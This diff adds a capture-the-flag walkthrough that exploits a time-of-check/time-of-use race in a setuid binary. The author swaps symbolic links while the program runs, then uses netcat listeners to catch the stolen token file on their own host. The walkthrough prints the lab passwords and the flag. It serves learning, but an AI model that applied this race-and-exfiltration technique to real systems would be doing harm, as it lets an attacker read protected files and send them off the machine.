@@ -1,0 +1,77 @@
+login/pw:
+	level10 : s5cAJpM8ev6XHw998pRWG728z
+
+ls -l
+	=> -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10	
+	=> -rw-------  1 flag10 flag10     26 Mar  5  2016 token
+
+First attempt:
+	So far all binaries to exploit are pretty self explanatory and I got lazy about creating a ghidra docker each time so let's run it
+	./level10
+		=>./level10 file host
+			=> sends file to host if you have access to it
+
+	Host:
+		nc -lvp 1234
+		ifconfig | grep inet
+			=> 192.168.1.61
+
+	Remote:
+		./level10 token 192.168.1.61:1234
+			=> You don't have access to token
+		./level10 /root 192.168.1.61:1234
+			=> You don't have access to /root
+				=> It is based on actual rights rather than a string comparison
+		echo abc > /tmp/test
+		./level10 /tmp/test 192.168.1.61:1234
+			=> Connecting to 192.168.1.61:1234:6969 .. Unable to connect to host 192.168.1.61:1234
+				=> Uses port 6969
+
+	Host:
+		nc -lvp 6969
+
+	Remote:
+		./level10 /tmp/test 192.168.1.61
+			=> Sending file .. wrote file!
+	Host:
+			=> abc
+
+	So we need to find a way to send the token file
+
+	gdb level10
+	disas main
+		=> 0x08048749 <+117>:	call   0x80485e0 <access@plt>
+			=> What is access function ?
+		man access
+			=> access() does not answer the "can I read/write/execute this file?" question.  It answers a slightly different question: "(assuming I'm  a  setuid  binary)  can the user who invoked me read/write/execute this file?"
+				NOTES:
+					=> Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the  user  might  exploit  the short  time  interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.
+						=> According to gdb open wasnt called yet so let's exploit it
+		=> 0x0804889b <+455>:	call   0x80485a0 <open@plt>
+	b *main+455
+	set args "/tmp/test" "192.168.1.61"
+		=> echo abc > /tmp/test
+	run
+		=> rm /tmp/test
+		=> ln -s ~/token /tmp/test
+	continue
+		=> Damn. Unable to open file
+			=> Once again, gdb is not running as suid
+
+RESOLUTION:
+	Lets count on luck
+		=> 2 infinite loops:
+			=> One changing the actual symbolic linc /tmp/test
+			=> One launching the level10 script
+	scp -P 4242 test.sh level10@192.168.1.23:/tmp/test.sh
+	Host:
+		nc -lvkp 6969
+			=> k to avoid keep on listening
+	Remote:
+		bash /tmp/test.sh
+	
+	su flag10
+		=> woupa2yuojeeaaed06riuj63c
+	getflag
+	=> Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+	
